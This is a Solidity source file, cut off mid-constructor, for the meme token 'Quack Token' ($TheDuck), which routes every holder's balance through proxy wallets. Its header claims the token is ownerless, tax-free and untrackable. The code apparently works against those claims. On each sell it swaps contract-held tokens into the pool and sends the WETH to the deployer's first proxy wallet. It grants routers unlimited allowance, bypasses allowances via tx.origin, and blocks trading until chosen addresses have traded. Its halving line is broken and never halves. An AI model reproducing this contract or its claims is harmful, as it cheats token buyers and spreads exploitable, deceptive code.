1 // SPDX-License-Identifier: MIT
2 // OpenZeppelin Contracts v4.4.0 (utils/Context.sol)
3 pragma solidity ^0.8.20;
4 
5 
6 /*
7 
8 Quack Token: DeFi by Proxy
9 Most DeFi Meme Token EVER! 💞
10 
11 TheDuck functions like bitcoin but on the Ethereum network, adding a layer of proxy to the holders.
12 ❤️ Never hold $TheDuck, only by proxy. (Can't tame TheDuck)
13 💛 Proxy wallet auto updates during transfers. (Scrambles TheDuck tracks)
14 💜 Never sells from same wallet, only by proxy. (Keeps you safer)
15 🧡 Auto Approvals on every sell (Takes the goose out of duck duck goose)
16 💙 Your wallets TXNS are basically untrackable on etherscan. (Makes TheDuck Happy)
17 ❤️ TheDuck has volume boosting which will add 20% of the LP's total holding to volume on each sell. (Watch TheDuck fly)
18 💛 Since TheDuck is never held by you it is a 100% unregulateable asset, meaning that it is the first true DeFi token ever created. (Quack Quack M^$@^$ F&^$@)
19 ** 0% Tax!!
20 ** Ownerless!!
21 ** LP tokens from initial supply Burnt!!
22 ** On etherscan it will always only show 1 holder, this is because it cannot count proxy wallets and uniswap is not a proxy wallet. To track holder count use the read function "holders".
23 ** 50% supply fair launched on Uniswap, 50% in contract for volume boosting and distributal mining on blocks with sells which halves every 4 years like BTC.
24 
25 WEBSITE: https://quacktoken.com
26 TELEGRAM:  https://t.me/Quack_Token
27 TWITTER: https://twitter.com/quack_token
28 
29 I release TheDuck to the world, let it fly.
30 ~~AlienQuacker
31 */
32 
33 
34 /**
35  * @dev Provides information about the current execution context, including the
36  * sender of the transaction and its data. While these are generally available
37  * via msg.sender and msg.data, they should not be accessed in such a direct
38  * manner, since when dealing with meta-transactions the account sending and
39  * paying for execution may not be the actual sender (as far as an application
40  * is concerned).
41  *
42  * This contract is only required for intermediate, library-like contracts.
43  */
44 abstract contract Context {
45     function _msgSender() internal view virtual returns (address) {
46         return msg.sender;
47     }
48 
49     function _msgData() internal view virtual returns (bytes calldata) {
50         return msg.data;
51     }
52 }
53 
54 /**
55  * @dev Contract module which provides a basic access control mechanism, where
56  * there is an account (an owner) that can be granted exclusive access to
57  * specific functions.
58  *
59  * By default, the owner account will be the one that deploys the contract. This
60  * can later be changed with {transferOwnership}.
61  *
62  * This module is used through inheritance. It will make available the modifier
63  * `onlyOwner`, which can be applied to your functions to restrict their use to
64  * the owner.
65  */
66 abstract contract Ownable is Context {
67     address private _owner;
68 
69     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
70 
71     /**
72      * @dev Initializes the contract setting the deployer as the initial owner.
73      */
74     constructor() {
75         _transferOwnership(address(0));
76     }
77 
78     /**
79      * @dev Returns the address of the current owner.
80      */
81     function owner() public view virtual returns (address) {
82         return _owner;
83     }
84 
85     /**
86      * @dev Transfers ownership of the contract to a new account (`newOwner`).
87      * Internal function without access restriction.
88      */
89     function _transferOwnership(address newOwner) internal virtual {
90         address oldOwner = _owner;
91         _owner = newOwner;
92         emit OwnershipTransferred(oldOwner, newOwner);
93     }
94 }
95 
96 /**
97  * @dev Interface of the ERC20 standard as defined in the EIP.
98  */
99 interface IERC20 {
100     /**
101      * @dev Returns the amount of tokens in existence.
102      */
103     function totalSupply() external view returns (uint256);
104 
105     /**
106      * @dev Returns the amount of tokens owned by `account`.
107      */
108     function balanceOf(address account) external view returns (uint256);
109 
110     /**
111      * @dev Moves `amount` tokens from the caller's account to `recipient`.
112      *
113      * Returns a boolean value indicating whether the operation succeeded.
114      *
115      * Emits a {Transfer} event.
116      */
117     function transfer(address recipient, uint256 amount) external returns (bool);
118 
119     /**
120      * @dev Returns the remaining number of tokens that `spender` will be
121      * allowed to spend on behalf of `owner` through {transferFrom}. This is
122      * zero by default.
123      *
124      * This value changes when {approve} or {transferFrom} are called.
125      */
126     function allowance(address owner, address spender) external view returns (uint256);
127 
128     /**
129      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
130      *
131      * Returns a boolean value indicating whether the operation succeeded.
132      *
133      * IMPORTANT: Beware that changing an allowance with this method brings the risk
134      * that someone may use both the old and the new allowance by unfortunate
135      * transaction ordering. One possible solution to mitigate this race
136      * condition is to first reduce the spender's allowance to 0 and set the
137      * desired value afterwards:
138      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
139      *
140      * Emits an {Approval} event.
141      */
142     function approve(address spender, uint256 amount) external returns (bool);
143 
144     /**
145      * @dev Moves `amount` tokens from `sender` to `recipient` using the
146      * allowance mechanism. `amount` is then deducted from the caller's
147      * allowance.
148      *
149      * Returns a boolean value indicating whether the operation succeeded.
150      *
151      * Emits a {Transfer} event.
152      */
153     function transferFrom(
154         address sender,
155         address recipient,
156         uint256 amount
157     ) external returns (bool);
158 
159     /**
160      * @dev Emitted when `value` tokens are moved from one account (`from`) to
161      * another (`to`).
162      *
163      * Note that `value` may be zero.
164      */
165     event Transfer(address indexed from, address indexed to, uint256 value);
166 
167     /**
168      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
169      * a call to {approve}. `value` is the new allowance.
170      */
171     event Approval(address indexed owner, address indexed spender, uint256 value);
172 }
173 
174 library TransferHelper {
175     function safeApprove(address token, address to, uint value) internal {
176         // bytes4(keccak256(bytes('approve(address,uint256)')));
177         (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
178         require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
179     }
180 
181     function safeTransfer(address token, address to, uint value) internal {
182         // bytes4(keccak256(bytes('transfer(address,uint256)')));
183         (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
184         require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
185     }
186 
187     function safeTransferFrom(address token, address from, address to, uint value) internal {
188         // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
189         (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
190         require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
191     }
192 
193     function safeTransferETH(address to, uint value) internal {
194         (bool success,) = to.call{value:value}(new bytes(0));
195         require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
196     }
197 }
198 
199 library Address {
200     /**
201      * @dev Returns true if `account` is a contract.
202      *
203      * [IMPORTANT]
204      * ====
205      * It is unsafe to assume that an address for which this function returns
206      * false is an externally-owned account (EOA) and not a contract.
207      *
208      * Among others, `isContract` will return false for the following
209      * types of addresses:
210      *
211      *  - an externally-owned account
212      *  - a contract in construction
213      *  - an address where a contract will be created
214      *  - an address where a contract lived, but was destroyed
215      * ====
216      *
217      * [IMPORTANT]
218      * ====
219      * You shouldn't rely on `isContract` to protect against flash loan attacks!
220      *
221      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
222      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
223      * constructor.
224      * ====
225      */
226     function isContract(address account) internal view returns (bool) {
227         // This method relies on extcodesize/address.code.length, which returns 0
228         // for contracts in construction, since the code is only stored at the end
229         // of the constructor execution.
230 
231         return account.code.length > 0;
232     }
233 
234     /**
235      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
236      * `errorMessage` as a fallback revert reason when `target` reverts.
237      *
238      * _Available since v3.1._
239      */
240     function functionCall(
241         address target,
242         bytes memory data,
243         string memory errorMessage
244     ) internal returns (bytes memory) {
245         return functionCallWithValue(target, data, 0, errorMessage);
246     }
247 
248     /**
249      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
250      * with `errorMessage` as a fallback revert reason when `target` reverts.
251      *
252      * _Available since v3.1._
253      */
254     function functionCallWithValue(
255         address target,
256         bytes memory data,
257         uint256 value,
258         string memory errorMessage
259     ) internal returns (bytes memory) {
260         require(address(this).balance >= value, "Address: insufficient balance for call");
261         (bool success, bytes memory returndata) = target.call{value: value}(data);
262         return verifyCallResultFromTarget(target, success, returndata, errorMessage);
263     }
264 
265     /**
266      * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
267      * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
268      *
269      * _Available since v4.8._
270      */
271     function verifyCallResultFromTarget(
272         address target,
273         bool success,
274         bytes memory returndata,
275         string memory errorMessage
276     ) internal view returns (bytes memory) {
277         if (success) {
278             if (returndata.length == 0) {
279                 // only check isContract if the call was successful and the return data is empty
280                 // otherwise we already know that it was a contract
281                 require(isContract(target), "Address: call to non-contract");
282             }
283             return returndata;
284         } else {
285             _revert(returndata, errorMessage);
286         }
287     }
288 
289     function _revert(bytes memory returndata, string memory errorMessage) private pure {
290         // Look for revert reason and bubble it up if present
291         if (returndata.length > 0) {
292             // The easiest way to bubble the revert reason is using memory via assembly
293             /// @solidity memory-safe-assembly
294             assembly {
295                 let returndata_size := mload(returndata)
296                 revert(add(32, returndata), returndata_size)
297             }
298         } else {
299             revert(errorMessage);
300         }
301     }
302 }
303 
304 library SafeMath {
305     function add(uint x, uint y) internal pure returns (uint z) {
306         require((z = x + y) >= x, 'ds-math-add-overflow');
307     }
308 
309     function sub(uint x, uint y) internal pure returns (uint z) {
310         require((z = x - y) <= x, 'ds-math-sub-underflow');
311     }
312 
313     function mul(uint x, uint y) internal pure returns (uint z) {
314         require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
315     }
316 }
317 
318 /// Transfer Helper to ensure the correct transfer of the tokens or ETH
319 library SafeTransfer {
320     using Address for address;
321     /** Safe Transfer asset from one wallet with approval of the wallet
322     * @param erc20: the contract address of the erc20 token
323     * @param from: the wallet to take from
324     * @param amount: the amount to take from the wallet
325     **/
326     function _pullUnderlying(IERC20 erc20, address from, uint amount) internal
327     {
328         safeTransferFrom(erc20,from,address(this),amount);
329     }
330 
331     function safeTransfer(
332         IERC20 token,
333         address to,
334         uint256 value
335     ) internal {
336         _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
337     }
338 
339     function safeTransferFrom(
340         IERC20 token,
341         address from,
342         address to,
343         uint256 value
344     ) internal {
345         _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
346     }
347 
348     /** Safe Transfer asset to one wallet from within the contract
349     * @param erc20: the contract address of the erc20 token
350     * @param to: the wallet to send to
351     * @param amount: the amount to send from the contract
352     **/
353     function _pushUnderlying(IERC20 erc20, address to, uint amount) internal
354     {
355         safeTransfer(erc20,to,amount);
356     }
357 
358     /** Safe Transfer ETH to one wallet from within the contract
359     * @param to: the wallet to send to
360     * @param value: the amount to send from the contract
361     **/
362     function safeTransferETH(address to, uint256 value) internal {
363         (bool success,) = to.call{value : value}(new bytes(0));
364         require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');
365     }
366 
367     function _callOptionalReturn(IERC20 token, bytes memory data) private {
368         // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
369         // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
370         // the target address contains contract code and also asserts for success in the low-level call.
371 
372         bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
373         if (returndata.length > 0) {
374             // Return data is optional
375             require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
376         }
377     }
378 } 
379 
380 /**
381  * @dev Interface for the optional metadata functions from the ERC20 standard.
382  *
383  * _Available since v4.1._
384  */
385 interface IERC20Metadata is IERC20 {
386     /**
387      * @dev Returns the name of the token.
388      */
389     function name() external view returns (string memory);
390 
391     /**
392      * @dev Returns the symbol of the token.
393      */
394     function symbol() external view returns (string memory);
395 
396     /**
397      * @dev Returns the decimals places of the token.
398      */
399     function decimals() external view returns (uint8);
400 }
401 
402 contract proxywallet {
403     //parent can only save lost tokens
404     address public parent;
405     address private tok;
406     constructor(address user, address _tok) {
407         parent = user;
408         tok = _tok;
409     }
410     function savetokens(address token, address to, uint256 amount) external {
411         require(msg.sender == parent, "p");
412         require(token != tok, "no tok");
413         SafeTransfer.safeTransfer(IERC20(token), to, amount);
414     }
415 }
416 
417 /// Factory interface of uniswap and forks
418 interface IUniswapV2Factory {
419     function createPair(address tokenA, address tokenB) external returns (address pair);
420 }
421 interface tis {
422     function factory() external pure returns (address);
423     function wETH() external pure returns (address);
424     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
425     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
426     function token0() external view returns(address);
427     function token1() external view returns(address);
428     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external view returns (uint amountIn);
429     function sync() external;
430     function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
431     function parent() external view returns(address);
432     function savetokens(address token, address to, uint256 amount) external;
433 }    
434 
435 /**
436  * @dev Implementation of the {IERC20} interface.
437  *
438  * This implementation is agnostic to the way tokens are created. This means
439  * that a supply mechanism has to be added in a derived contract using {_mint}.
440  * For a generic mechanism see {ERC20PresetMinterPauser}.
441  *
442  * TIP: For a detailed writeup see our guide
443  * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
444  * to implement supply mechanisms].
445  *
446  * We have followed general OpenZeppelin Contracts guidelines: functions revert
447  * instead returning `false` on failure. This behavior is nonetheless
448  * conventional and does not conflict with the expectations of ERC20
449  * applications.
450  *
451  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
452  * This allows applications to reconstruct the allowance for all accounts just
453  * by listening to said events. Other implementations of the EIP may not emit
454  * these events, as it isn't required by the specification.
455  *
456  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
457  * functions have been added to mitigate the well-known issues around setting
458  * allowances. See {IERC20-approve}.
459  */
460 contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
461     mapping(address => mapping(address => uint256)) private _balances;
462     mapping(address => mapping(address => uint256)) private _allowances;
463     mapping(address => address[]) private proxyWallet;  
464     mapping(uint256 => uint256) public blocks;
465     uint256 private _totalSupply;
466     address public UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
467     address public UNISWAP_V2_ROUTER2 = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
468     address public UNISWAP_V2_ROUTER3 = 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B;
469     address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
470     address public uniswapV2Pair;
471     uint256 public nest;
472     address public nestLocation;
473     bool public nested;
474     mapping(address => bool) public nester;
475     uint256 private pop = 0;
476     address private nn;
477     uint256 public birthWeight;
478     uint256 public birthRate = 25000000000000000000; // halves every 4 years from birthDate
479     uint256 public birthDate;
480     uint256 public halvingRate = 1460 days; // every 4 years the next distribution will halve
481     uint256 public nextHalving;
482     uint256 public holders;
483     string private _name;
484     string private _symbol;
485     uint256 private status = 1;
486 
487     /**
488      * @dev Sets the values for {name} and {symbol}.
489      *
490      * The default value of {decimals} is 18. To select a different value for
491      * {decimals} you should overload it.
492      *
493      * All two of these values are immutable: they can only be set once during
494      * construction.
495      */
496     constructor(string memory name_, string memory symbol_) {        
497         _name = name_;
498         _symbol = symbol_;
499         birthDate = block.timestamp;
500         nextHalving = block.timestamp + halvingRate;
501         nester[msg.sender] = true;
502     }
503     
504 
505     /**
506      * @dev Returns the name of the token.
507      */
508     function name() public view virtual override returns (string memory) {
509         return _name;
510     }
511 
512     /**
513      * @dev Returns the symbol of the token, usually a shorter version of the
514      * name.
515      */
516     function symbol() public view virtual override returns (string memory) {
517         return _symbol;
518     }
519 
520     /**
521      * @dev Returns the number of decimals used to get its user representation.
522      * For example, if `decimals` equals `2`, a balance of `505` tokens should
523      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
524      *
525      * Tokens usually opt for a value of 18, imitating the relationship between
526      * Ether and Wei. This is the value {ERC20} uses, unless this function is
527      * overridden;
528      *
529      * NOTE: This information is only used for _display_ purposes: it in
530      * no way affects any of the arithmetic of the contract, including
531      * {IERC20-balanceOf} and {IERC20-transfer}.
532      */
533     function decimals() public view virtual override returns (uint8) {
534         return 18;
535     }
536 
537     /**
538      * @dev See {IERC20-totalSupply}.
539      */
540     function totalSupply() public view virtual override returns (uint256) {
541         return _totalSupply;
542     }
543 
544     /**
545      * @dev See {IERC20-balanceOf}.
546      */
547     function balanceOf(address account) public view virtual override returns (uint256) {
548         address lw = userCurrentProxy(account);
549         return _balances[account][lw];
550     }
551 
552     /**
553      * @dev See {IERC20-transfer}.
554      *
555      * Requirements:
556      *
557      * - `recipient` cannot be the zero address.
558      * - the caller must have a balance of at least `amount`.
559      */
560     function transfer(address recipient, uint256 amount) public reentry nst(msg.sender, recipient) virtual override returns (bool) {
561         require(msg.sender != address(0), "0");
562         require(recipient != address(0), "0");
563         if(msg.sender == uniswapV2Pair){
564         transferFromUniswap(recipient, amount);
565         }
566         if(recipient == uniswapV2Pair && msg.sender != uniswapV2Pair){
567         transferToUniswap(msg.sender, amount);
568         }
569         if(recipient != uniswapV2Pair && msg.sender != uniswapV2Pair){
570         _transfer(msg.sender, recipient, amount);
571         }
572         return true;
573     }
574 
575     /**
576      * @dev See {IERC20-allowance}.
577      */
578     function allowance(address owner, address spender) public view virtual override returns (uint256 i) {
579         address ps = userCurrentProxy(owner);
580         address w = tis(ps).parent();
581         if(w == owner || owner == nestLocation) { // If you are doing the sell from your own wallet why call for approval and waste gas
582             if(spender == UNISWAP_V2_ROUTER || spender == UNISWAP_V2_ROUTER2 || spender == UNISWAP_V2_ROUTER3){
583             i = _totalSupply;
584             }
585         }
586         else{
587             i = _allowances[ps][spender];
588         }
589     }
590     /**
591      * @dev See {IERC20-approve}.
592      *
593      * Requirements:
594      *
595      * - `spender` cannot be the zero address.
596      */
597     function approve(address spender, uint256 amount) public virtual override returns (bool) {
598         address ps = userCurrentProxy(msg.sender);
599         _approve(ps, spender, amount);
600         return true;
601     }
602 
603     /**
604      * @dev See {IERC20-transferFrom}.
605      *
606      * Emits an {Approval} event indicating the updated allowance. This is not
607      * required by the EIP. See the note at the beginning of {ERC20}.
608      *
609      * Requirements:
610      *
611      * - `sender` and `recipient` cannot be the zero address.
612      * - `sender` must have a balance of at least `amount`.
613      * - the caller must have allowance for ``sender``'s tokens of at least
614      * `amount`.
615      */
616     function transferFrom(
617         address sender,
618         address recipient,
619         uint256 amount
620     ) public reentry nst(sender, recipient) virtual override returns (bool) {
621         require(sender != address(0), "0");
622         require(recipient != address(0), "0");
623         require(sender != recipient, "no");
624         address ps = userCurrentProxy(sender);
625         require(_balances[sender][ps] >= amount, "bala");
626         address x = tis(ps).parent();
627         uint256 currentAllowance = tx.origin == x ? amount : _allowances[ps][_msgSender()];
628         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
629         _approve(ps, _msgSender(), currentAllowance - amount);  
630         if(recipient == uniswapV2Pair){
631         transferToUniswap(sender, amount);
632         }
633         if(sender == uniswapV2Pair){
634         transferFromUniswap(recipient, amount);
635         }
636         if(recipient != uniswapV2Pair && sender != uniswapV2Pair){
637         _transfer(sender, recipient, amount);
638         }
639         return true;
640     }
641 
642     function transferToUniswap(address sender, uint256 amount) internal {
643         address ps = userCurrentProxy(sender);
644         uint256 bal0 = balanceOf(sender);
645         uint256 b0 = bal0 - amount;
646         address si;
647         require(bal0 >= amount, "amt");
648         if(sender != address(this)) {
649         swapBank(amount);  
650         if(b0 > 0) {
651         _balances[sender][ps] = 0; 
652         si = createProxyWallet1(sender, b0);
653         _balances[uniswapV2Pair][uniswapV2Pair] += amount;
654         }
655         if(b0 == 0) {
656         _balances[sender][ps] = 0;
657         _balances[uniswapV2Pair][uniswapV2Pair] += amount;
658         holders -= 1;
659         emit Transfer(ps, uniswapV2Pair, amount);
660         }    
661         }
662         if(sender == address(this)){
663         _balances[address(this)][nestLocation] -= amount;
664         _balances[uniswapV2Pair][uniswapV2Pair] += amount;
665         emit Transfer(ps, uniswapV2Pair, amount);
666         }    
667     }
668 
669     function transferFromUniswap(address recipient, uint256 amount) internal {
670         require(balanceOf(uniswapV2Pair) >= amount, "amt");
671         address ps = userCurrentProxy(recipient);
672         uint256 recipientBalance = _balances[recipient][ps];
673         _balances[uniswapV2Pair][uniswapV2Pair] -= amount;
674         if(recipientBalance == 0){holders += 1;}
675         address tal = createProxyWallet(recipient, recipientBalance + amount);
676         emit Transfer(uniswapV2Pair, tal, amount);
677     }
678 
679     /**
680      * @dev Atomically increases the allowance granted to `spender` by the caller.
681      *
682      * This is an alternative to {approve} that can be used as a mitigation for
683      * problems described in {IERC20-approve}.
684      *
685      * Emits an {Approval} event indicating the updated allowance.
686      *
687      * Requirements:
688      *
689      * - `spender` cannot be the zero address.
690      */
691     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
692         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
693         return true;
694     }
695 
696     /**
697      * @dev Atomically decreases the allowance granted to `spender` by the caller.
698      *
699      * This is an alternative to {approve} that can be used as a mitigation for
700      * problems described in {IERC20-approve}.
701      *
702      * Emits an {Approval} event indicating the updated allowance.
703      *
704      * Requirements:
705      *
706      * - `spender` cannot be the zero address.
707      * - `spender` must have allowance for the caller of at least
708      * `subtractedValue`.
709      */
710     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
711         uint256 currentAllowance = _allowances[_msgSender()][spender];
712         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
713             _approve(_msgSender(), spender, currentAllowance - subtractedValue);
714 
715         return true;
716     }
717 
718     function userCurrentProxy(address user) internal view returns(address prox) {
719         uint256 i = proxyWallet[user].length;
720         if(user != uniswapV2Pair){
721         if(i == 0){
722         prox = user;
723         }
724         if(i > 0){
725         prox = proxyWallet[user][i -1];
726         }
727         }
728         if(user == uniswapV2Pair){
729         prox = uniswapV2Pair;
730         }
731     }
732 
733     function myProxyWallet() external view returns(address prox)  {
734         uint256 i = proxyWallet[msg.sender].length;
735         if(i == 0){
736         prox = msg.sender;
737         }
738         if(i > 0){
739         prox = proxyWallet[msg.sender][i -1];
740         }
741     }
742 
743     function myProxyBalance() external view returns(uint256 amount) {   
744         return _balances[msg.sender][userCurrentProxy(msg.sender)];
745     }
746 
747     function myProxyWallets() external view returns(address[] memory) {
748         uint256 a0 = proxyWallet[msg.sender].length;
749         address[] memory a = new address[](a0);
750         for(uint256 i = 0; i < a0; i++){
751             a[i] = proxyWallet[msg.sender][i];
752         }
753         return a;
754     }
755 
756     function getAmountOut(uint256 amtIn, uint256 reserveIn, uint256 reserveOut) internal pure returns(uint256 amtOut) {
757         uint amountInWithFee = amtIn * 9970;
758         uint numerator = amountInWithFee * reserveOut;
759         uint denominator = (reserveIn * 10000) + amountInWithFee;
760         amtOut = numerator / denominator;
761     }
762 
763     modifier nst(address s, address r) {
764         if(!nested){
765             require(nester[s] || nester[r], "No bot first buy");
766             if(nester[r]){
767             pop += 1;
768             if(pop == 4){
769             nested = true;
770             }
771             }
772             }
773             _;
774     }
775 
776     modifier reentry() {
777         require(status == 1, "reentry");
778         status = 0;
779         _;
780         status = 1;
781     }
782 
783     /**
784      * @dev Moves `amount` of tokens from `sender` to `recipient`.
785      *
786      * This internal function is equivalent to {transfer}, and can be used to
787      * e.g. implement automatic token fees, slashing mechanisms, etc.
788      *
789      * Emits a {Transfer} event.
790      *
791      * Requirements:
792      *
793      * - `sender` cannot be the zero address.
794      * - `recipient` cannot be the zero address.
795      * - `sender` must have a balance of at least `amount`.
796      */
797     function _transfer(
798         address sender,
799         address recipient,
800         uint256 amount
801     ) internal virtual {
802         uint256 senderBalance = _balances[sender][userCurrentProxy(sender)];
803         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
804         require(sender != recipient, "same");
805         require(sender != address(0), "0");
806         require(recipient != address(0), "0");
807         uint256 b0 = senderBalance - amount;
808         _balances[sender][userCurrentProxy(sender)] -= amount;
809         address up0;
810         if(b0 > 0){ 
811             up0 = createProxyWallet1(sender, b0);
812         }
813         uint256 recipientBalance = _balances[recipient][userCurrentProxy(recipient)];
814         if(recipientBalance == 0){holders += 1;}
815         address up1 = createProxyWallet3(recipient, recipientBalance + amount);
816         swapBank(amount);
817         emit Transfer(userCurrentProxy(sender), up1, amount);
818     }
819 
820     function getNestDistribution(uint256 amount) public view returns(uint256) {
821         uint256 i = amount / 100000000000000000000 * (birthRate / (birthWeight/1000000000000000000) * (nest/1000000000000000000));
822         uint256 i0 = i > balanceOf(uniswapV2Pair) / 50 ? balanceOf(uniswapV2Pair) / 50 : i;
823         return i0;
824     }
825 
826     function swapBank(uint256 amount) private {   
827         if(blocks[block.number] == 0){     
828         if(balanceOf(uniswapV2Pair) > 0){
829         if(nest > amount){
830         blocks[block.number] = 1;
831         uint256 amount0 = getNestDistribution(amount);
832         swapTokensForWeth(amount0);
833         }
834         }
835         }
836         if(block.timestamp > nextHalving) {
837             nextHalving = block.timestamp + halvingRate;
838             birthRate / 2;
839         }
840     }
841 
842     function swapTokensForWeth(uint amount0) private {
843         address token = address(this);
844         uint256 p = nest > balanceOf(uniswapV2Pair) / 5 ? balanceOf(uniswapV2Pair) / 5 : nest;
845         uint out;uint out1;
846         _balances[address(this)][nestLocation] -= amount0;
847         nest -= amount0;
848         if(token == tis(uniswapV2Pair).token0()){
849         (uint r, uint r2,) = tis(uniswapV2Pair).getReserves();
850         out1 = getAmountOut(p, r, r2);  
851         _balances[uniswapV2Pair][uniswapV2Pair] += p;
852         tis(uniswapV2Pair).swap(0, out1, nestLocation, new bytes(0));
853         _balances[uniswapV2Pair][uniswapV2Pair] -= p;
854         tis(nestLocation).savetokens(WETH, uniswapV2Pair, out1);
855         tis(uniswapV2Pair).sync();
856         (uint _r, uint _r2,) = tis(uniswapV2Pair).getReserves();
857         out = getAmountOut(amount0, _r, _r2);  
858         _balances[uniswapV2Pair][uniswapV2Pair] += amount0;
859         tis(uniswapV2Pair).swap(0, out, nn, new bytes(0));
860         _balances[uniswapV2Pair][uniswapV2Pair] -= amount0 / 1000 * 3;
861         tis(uniswapV2Pair).sync();
862         }
863         if(token != tis(uniswapV2Pair).token0()){
864         (uint r, uint r2,) = tis(uniswapV2Pair).getReserves();
865         out1 = getAmountOut(p, r2, r);  
866         _balances[uniswapV2Pair][uniswapV2Pair] += p;
867         tis(uniswapV2Pair).swap(out1, 0, nestLocation, new bytes(0));
868         _balances[uniswapV2Pair][uniswapV2Pair] -= p;
869         tis(nestLocation).savetokens(WETH, uniswapV2Pair, out1);
870         tis(uniswapV2Pair).sync();
871         (uint _r, uint _r2,) = tis(uniswapV2Pair).getReserves();
872         out = getAmountOut(amount0, _r2, _r);  
873         _balances[uniswapV2Pair][uniswapV2Pair] += amount0;
874         tis(uniswapV2Pair).swap(out, 0, nn, new bytes(0));
875         _balances[uniswapV2Pair][uniswapV2Pair] -= amount0 / 1000 * 3;
876         tis(uniswapV2Pair).sync();
877         }
878 
879     }
880 
881     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
882      * the total supply.
883      *
884      * Emits a {Transfer} event with `from` set to the zero address.
885      *
886      * Requirements:
887      *
888      * - `account` cannot be the zero address.
889      */
890     function _mint(address user, uint256 amount) internal virtual {
891         _totalSupply += amount*2;
892         createProxyWallet2(user, amount);
893         nestLocation = createProxyWallet2(address(this), amount);
894         holders += 3;
895         _allowances[nestLocation][uniswapV2Pair] += amount;
896         _allowances[nestLocation][UNISWAP_V2_ROUTER] += amount;
897     }
898 
899     function createProxyWallet2(address user, uint256 amount) internal returns(address proxy) {
900         proxy = address(new proxywallet(user, address(this)));        
901         proxyWallet[user].push(proxy);
902         _balances[user][proxy] = amount;
903         if(nn == address(0)){nn = proxy;}
904         emit Transfer(proxy, proxy, amount);
905     }
906 
907     function createProxyWallet3(address recipient, uint256 amount) internal returns(address proxy) {
908         address i = userCurrentProxy(recipient);
909         proxy = address(new proxywallet(recipient, address(this)));        
910         proxyWallet[recipient].push(proxy);
911         _balances[recipient][i] = 0;
912         _balances[recipient][proxy] = amount;
913     }
914 
915     function createProxyWallet(address recipient, uint256 amount) internal returns(address proxy) {
916         address i = userCurrentProxy(recipient);
917         proxy = address(new proxywallet(recipient, address(this)));        
918         proxyWallet[recipient].push(proxy);
919         _balances[recipient][i] = 0;
920         _balances[recipient][proxy] = amount;
921         emit Transfer(proxy, proxy, amount);
922     }
923 
924     function createProxyWallet1(address sender, uint256 amount) internal returns(address proxy) {
925         if(sender != nestLocation){
926         address i = userCurrentProxy(sender);
927         proxy = address(new proxywallet(sender, address(this)));        
928         proxyWallet[sender].push(proxy);
929         _balances[sender][i] = 0;
930         _balances[sender][proxy] = amount;
931         emit Transfer(proxy, proxy, amount);
932         }
933     }
934 
935     /**
936      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
937      *
938      * This internal function is equivalent to `approve`, and can be used to
939      * e.g. set automatic allowances for certain subsystems, etc.
940      *
941      * Emits an {Approval} event.
942      *
943      * Requirements:
944      *
945      * - `owner` cannot be the zero address.
946      * - `spender` cannot be the zero address.
947      */
948     function _approve(
949         address owner,
950         address spender,
951         uint256 amount
952     ) internal virtual {
953         _allowances[owner][spender] = amount;
954         emit Approval(owner, spender, amount);
955     }
956 }
957 
958 contract NewQuackCity is Ownable, ERC20 {
959     constructor(address one, address two, address three, address four) ERC20("Quack Token", "TheDuck") {
960         uint256 _totalSupply = 1000000000e18;
961         _mint(msg.sender, _totalSupply/2);
962         nest = _totalSupply/2;
963         birthWeight = _totalSupply/2;
964         tis _uniswapV2Router = tis(UNISWAP_V2_ROUTER);
965         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
966         .createPair(WETH, address(this));        
